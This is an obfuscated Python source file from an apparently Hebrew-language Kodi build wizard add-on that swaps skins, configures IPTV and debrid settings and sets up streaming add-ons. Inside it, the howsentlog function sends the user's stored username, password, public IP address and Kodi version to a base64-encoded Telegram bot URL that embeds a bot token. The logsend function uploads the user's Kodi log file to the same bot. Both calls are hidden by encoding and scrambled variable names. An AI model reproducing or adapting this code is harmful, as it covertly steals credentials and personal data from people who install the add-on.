# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
def MainMenu ():#line:256
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:258
def skinWIN ():#line:259
	idle ()#line:260
	OOO0OOO0OO0O00O00 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:261
	OOOO00000OO00OO00 =[];OOO000O00OO0OO0O0 =[]#line:262
	for OOO0OOOOOO000O0OO in sorted (OOO0OOO0OO0O00O00 ,key =lambda O00O0OO0O000O0O0O :O00O0OO0O000O0O0O ):#line:263
		OOOOOOO00O0OOO00O =os .path .split (OOO0OOOOOO000O0OO [:-1 ])[1 ]#line:264
		O00O0OOO000OO00OO =os .path .join (OOO0OOOOOO000O0OO ,'addon.xml')#line:265
		if os .path .exists (O00O0OOO000OO00OO ):#line:266
			O0O0O0O0OO0000000 =open (O00O0OOO000OO00OO )#line:267
			OO0O0OO00OO0O0OOO =O0O0O0O0OO0000000 .read ()#line:268
			O0OO0O0O0OO000O00 =parseDOM2 (OO0O0OO00OO0O0OOO ,'addon',ret ='id')#line:269
			O00OO00000OO0OO00 =OOOOOOO00O0OOO00O if len (O0OO0O0O0OO000O00 )==0 else O0OO0O0O0OO000O00 [0 ]#line:270
			try :#line:271
				O0O0OO00O00O0O0O0 =xbmcaddon .Addon (id =O00OO00000OO0OO00 )#line:272
				OOOO00000OO00OO00 .append (O0O0OO00O00O0O0O0 .getAddonInfo ('name'))#line:273
				OOO000O00OO0OO0O0 .append (O00OO00000OO0OO00 )#line:274
			except :#line:275
				pass #line:276
	OO0O0OOOO00OO0000 =[];O0O000O0OOOOOO0OO =0 #line:277
	OO000OO000OOO00OO =["Current Skin -- %s"%currSkin ()]+OOOO00000OO00OO00 #line:278
	O0O000O0OOOOOO0OO =DIALOG .select ("Select the Skin you want to swap with.",OO000OO000OOO00OO )#line:279
	if O0O000O0OOOOOO0OO ==-1 :return #line:280
	else :#line:281
		O0OO0O0OOOOO00O0O =(O0O000O0OOOOOO0OO -1 )#line:282
		OO0O0OOOO00OO0000 .append (O0OO0O0OOOOO00O0O )#line:283
		OO000OO000OOO00OO [O0O000O0OOOOOO0OO ]="%s"%(OOOO00000OO00OO00 [O0OO0O0OOOOO00O0O ])#line:284
	if OO0O0OOOO00OO0000 ==None :return #line:285
	for O00OO0O00OO0OO000 in OO0O0OOOO00OO0000 :#line:286
		swapSkins (OOO000O00OO0OO0O0 [O00OO0O00OO0OO000 ])#line:287
def currSkin ():#line:289
	return xbmc .getSkinDir ('Container.PluginName')#line:290
def swapSkins (OOO0O0000000OO000 ,title ="Error"):#line:291
	O0OOO0OOO0O000000 ='lookandfeel.skin'#line:292
	O0O0000OOOO0O0OO0 =OOO0O0000000OO000 #line:293
	O0O0OOO00OOOOOOO0 =getOld (O0OOO0OOO0O000000 )#line:294
	O000OOO0O00O00O00 =O0OOO0OOO0O000000 #line:295
	setNew (O000OOO0O00O00O00 ,O0O0000OOOO0O0OO0 )#line:296
	OO00000000OOO00O0 =0 #line:297
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00000000OOO00O0 <100 :#line:298
		OO00000000OOO00O0 +=1 #line:299
		xbmc .sleep (1 )#line:300
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:301
		xbmc .executebuiltin ('SendClick(11)')#line:302
	return True #line:303
def getOld (OOO0O000OO0O000OO ):#line:305
	try :#line:306
		OOO0O000OO0O000OO ='"%s"'%OOO0O000OO0O000OO #line:307
		OO00OOOOOOO00OO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO0O000OO0O000OO )#line:308
		OO000O00OO000OO0O =xbmc .executeJSONRPC (OO00OOOOOOO00OO0O )#line:310
		OO000O00OO000OO0O =simplejson .loads (OO000O00OO000OO0O )#line:311
		if OO000O00OO000OO0O .has_key ('result'):#line:312
			if OO000O00OO000OO0O ['result'].has_key ('value'):#line:313
				return OO000O00OO000OO0O ['result']['value']#line:314
	except :#line:315
		pass #line:316
	return None #line:317
def setNew (OO0OOO000O0000OOO ,O0O0O0OOOOOOO0000 ):#line:320
	try :#line:321
		OO0OOO000O0000OOO ='"%s"'%OO0OOO000O0000OOO #line:322
		O0O0O0OOOOOOO0000 ='"%s"'%O0O0O0OOOOOOO0000 #line:323
		OOO0O000O0O0OO0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OOO000O0000OOO ,O0O0O0OOOOOOO0000 )#line:324
		OOO00O0000O0000OO =xbmc .executeJSONRPC (OOO0O000O0O0OO0OO )#line:326
	except :#line:327
		pass #line:328
	return None #line:329
def idle ():#line:330
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:331
def resetkodi ():#line:333
		if xbmc .getCondVisibility ('system.platform.windows'):#line:334
			OOOO000O0OOO00OOO =xbmcgui .DialogProgress ()#line:335
			OOOO000O0OOO00OOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:338
			OOOO000O0OOO00OOO .update (0 )#line:339
			for O00OOOO0OOO0O0O0O in range (5 ,-1 ,-1 ):#line:340
				time .sleep (1 )#line:341
				OOOO000O0OOO00OOO .update (int ((5 -O00OOOO0OOO0O0O0O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O00OOOO0OOO0O0O0O ),'')#line:342
				if OOOO000O0OOO00OOO .iscanceled ():#line:343
					from resources .libs import win #line:344
					return None ,None #line:345
			from resources .libs import win #line:346
		else :#line:347
			OOOO000O0OOO00OOO =xbmcgui .DialogProgress ()#line:348
			OOOO000O0OOO00OOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:351
			OOOO000O0OOO00OOO .update (0 )#line:352
			for O00OOOO0OOO0O0O0O in range (5 ,-1 ,-1 ):#line:353
				time .sleep (1 )#line:354
				OOOO000O0OOO00OOO .update (int ((5 -O00OOOO0OOO0O0O0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O00OOOO0OOO0O0O0O ),'')#line:355
				if OOOO000O0OOO00OOO .iscanceled ():#line:356
					os ._exit (1 )#line:357
					return None ,None #line:358
			os ._exit (1 )#line:359
def backtokodi ():#line:361
			wiz .kodi17Fix ()#line:362
			fix18update ()#line:363
			fix17update ()#line:364
def testcommand2 ():#line:366
    wiz .kodi17Fix ()#line:368
def autotrakt ():#line:370
    OOO00O0O00OO0OO0O =(ADDON .getSetting ("auto_trk"))#line:371
    if OOO00O0O00OO0OO0O =='true':#line:372
       from resources .libs import trk_aut #line:373
def traktsync ():#line:375
     from resources .libs import trk_aut #line:377
def imdb_synck ():#line:379
   try :#line:380
     O0000O000O00OO0O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:381
     OO000O0O00O00O0OO =xbmcaddon .Addon ('plugin.video.gaia')#line:382
     OO0O0OO00OO00000O =(ADDON .getSetting ("imdb_sync"))#line:383
     OOOOO0O000O00OOOO ="imdb.user"#line:384
     O0O00OOOO00O0OOO0 ="accounts.informants.imdb.user"#line:385
     O0000O000O00OO0O0 .setSetting (OOOOO0O000O00OOOO ,str (OO0O0OO00OO00000O ))#line:386
     OO000O0O00O00O0OO .setSetting ('accounts.informants.imdb.enabled','true')#line:387
     OO000O0O00O00O0OO .setSetting (O0O00OOOO00O0OOO0 ,str (OO0O0OO00OO00000O ))#line:388
   except :pass #line:389
def dis_or_enable_addon (O0O0OO00OOO00OOO0 ,OOOO0O0O000OOO00O ,enable ="true"):#line:391
    import json #line:392
    O000OO0O00OO0OO0O ='"%s"'%O0O0OO00OOO00OOO0 #line:393
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OO00OOO00OOO0 )and enable =="true":#line:394
        logging .warning ('already Enabled')#line:395
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O0OO00OOO00OOO0 )#line:396
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0OO00OOO00OOO0 )and enable =="false":#line:397
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O0OO00OOO00OOO0 )#line:398
    else :#line:399
        OOOOO00000OO0OO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000OO0O00OO0OO0O ,enable )#line:400
        O0O00O000OO0O00OO =xbmc .executeJSONRPC (OOOOO00000OO0OO0O )#line:401
        O0OO0OO0O0O000000 =json .loads (O0O00O000OO0O00OO )#line:402
        if enable =="true":#line:403
            xbmc .log ("### Enabled %s, response = %s"%(O0O0OO00OOO00OOO0 ,O0OO0OO0O0O000000 ))#line:404
        else :#line:405
            xbmc .log ("### Disabled %s, response = %s"%(O0O0OO00OOO00OOO0 ,O0OO0OO0O0O000000 ))#line:406
    if OOOO0O0O000OOO00O =='auto':#line:407
     return True #line:408
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:409
def testcommand ():#line:412
  try :#line:413
    OO00O0O0000OO0000 =(ADDON .getSetting ("iptv_on"))#line:414
    if OO00O0O0000OO0000 =='true':#line:416
       if KODIV >=17 and KODIV <18 :#line:418
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:419
         O00O0O00O00O0OOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:420
         OO00OOO0O00O00OO0 =(ADDON .getSetting ("iptvUrl"))#line:422
         O00O0O00O00O0OOO0 .setSetting ('m3uUrl',OO00OOO0O00O00OO0 )#line:423
         OOOO000O0OOO000OO =(ADDON .getSetting ("epg_Url"))#line:424
         O00O0O00O00O0OOO0 .setSetting ('epgUrl',OOOO000O0OOO000OO )#line:425
       if KODIV >=18 :#line:428
         iptvsimpldown ()#line:429
         wiz .kodi17Fix ()#line:430
         xbmc .sleep (1000 )#line:431
         O00O0O00O00O0OOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:432
         OO00OOO0O00O00OO0 =(ADDON .getSetting ("iptvUrl"))#line:433
         O00O0O00O00O0OOO0 .setSetting ('m3uUrl',OO00OOO0O00O00OO0 )#line:434
         OOOO000O0OOO000OO =(ADDON .getSetting ("epg_Url"))#line:435
         O00O0O00O00O0OOO0 .setSetting ('epgUrl',OOOO000O0OOO000OO )#line:436
  except :pass #line:438
def howsentlog ():#line:445
       try :#line:446
          import json #line:447
          O0OOO0OOOOOO0OO0O =(ADDON .getSetting ("user"))#line:448
          OOO0OO0O0OO0OOO00 =(ADDON .getSetting ("pass"))#line:449
          OOO0OOO0OOO0O00OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:450
          OOOOO0000O00O00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:452
          O00OO0O0O000OO000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:453
          OO0OOO0O000OOO0O0 =str (json .loads (O00OO0O0O000OO000 )['ip'])#line:454
          O00OO00OO0O00OOO0 =O0OOO0OOOOOO0OO0O #line:455
          O00OO00OOOOOOOO00 =OOO0OO0O0OO0OOO00 #line:456
          import socket #line:458
          O00OO0O0O000OO000 =urllib2 .urlopen (OOOOO0000O00O00O0 .decode ('base64')+' - '+O00OO00OO0O00OOO0 +' - '+O00OO00OOOOOOOO00 +' - '+OOO0OOO0OOO0O00OO ).readlines ()#line:459
       except :pass #line:460
def googleindicat ():#line:463
			import logg #line:464
			O0O0OO00OOO0O0OO0 =(ADDON .getSetting ("pass"))#line:465
			OOOOO0O00OO0O0OO0 =(ADDON .getSetting ("user"))#line:466
			logg .logGA (O0O0OO00OOO0O0OO0 ,OOOOO0O00OO0O0OO0 )#line:467
def logsend ():#line:468
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:469
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:470
      howsentlog ()#line:472
      import requests #line:473
      if xbmc .getCondVisibility ('system.platform.windows'):#line:474
         OOOO0000O000O0O0O =xbmc .translatePath ('special://home/kodi.log')#line:475
         OOO0OO00OO000O0O0 ={'chat_id':(None ,'-274262389'),'document':(OOOO0000O000O0O0O ,open (OOOO0000O000O0O0O ,'rb')),}#line:479
         OOO000O00OO0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:480
         O0O00OOO0OO0OOOO0 =requests .post (OOO000O00OO0O0OO0 .decode ('base64'),files =OOO0OO00OO000O0O0 )#line:482
      elif xbmc .getCondVisibility ('system.platform.android'):#line:483
           OOOO0000O000O0O0O =xbmc .translatePath ('special://temp/kodi.log')#line:484
           OOO0OO00OO000O0O0 ={'chat_id':(None ,'-274262389'),'document':(OOOO0000O000O0O0O ,open (OOOO0000O000O0O0O ,'rb')),}#line:488
           OOO000O00OO0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:489
           O0O00OOO0OO0OOOO0 =requests .post (OOO000O00OO0O0OO0 .decode ('base64'),files =OOO0OO00OO000O0O0 )#line:491
      else :#line:492
           OOOO0000O000O0O0O =xbmc .translatePath ('special://kodi.log')#line:493
           OOO0OO00OO000O0O0 ={'chat_id':(None ,'-274262389'),'document':(OOOO0000O000O0O0O ,open (OOOO0000O000O0O0O ,'rb')),}#line:497
           OOO000O00OO0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:498
           O0O00OOO0OO0OOOO0 =requests .post (OOO000O00OO0O0OO0 .decode ('base64'),files =OOO0OO00OO000O0O0 )#line:500
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:501
def rdoff ():#line:503
	OOO000OO00000O0O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:504
	OOO000OO00000O0O0 .setSetting ('rd.client_id','')#line:505
	OOO000OO00000O0O0 .setSetting ('rd.secret','')#line:506
	OOO000OO00000O0O0 .setSetting ('rdsource','false')#line:507
	OOO000OO00000O0O0 .setSetting ('super_fast_type_toren','false')#line:508
	OOO000OO00000O0O0 .setSetting ('rd.auth','false')#line:509
	OOO000OO00000O0O0 .setSetting ('rd.refresh','false')#line:510
	OOO000OO00000O0O0 =xbmcaddon .Addon ('script.module.resolveurl')#line:512
	OOO000OO00000O0O0 .setSetting ('RealDebridResolver_client_id','')#line:513
	OOO000OO00000O0O0 .setSetting ('RealDebridResolver_client_secret','')#line:514
	OOO000OO00000O0O0 .setSetting ('RealDebridResolver_token','')#line:515
	OOO000OO00000O0O0 .setSetting ('RealDebridResolver_refresh','')#line:516
	OOO000OO00000O0O0 =xbmcaddon .Addon ('plugin.video.seren')#line:518
	OOO000OO00000O0O0 .setSetting ('rd.client_id','')#line:519
	OOO000OO00000O0O0 .setSetting ('rd.secret','')#line:520
	OOO000OO00000O0O0 .setSetting ('rd.auth','')#line:521
	OOO000OO00000O0O0 .setSetting ('rd.refresh','')#line:522
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:523
		OOO000OO00000O0O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:524
		OOO000OO00000O0O0 .setSetting ('accounts.debrid.realdebrid.id','')#line:525
		OOO000OO00000O0O0 .setSetting ('accounts.debrid.realdebrid.secret','')#line:526
		OOO000OO00000O0O0 .setSetting ('accounts.debrid.realdebrid.token','')#line:527
		OOO000OO00000O0O0 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:528
	resloginit .resloginit ('restore','all')#line:529
	OOO0O0O00OOO00O00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:531
	OO0OO0OO00OOOO000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:532
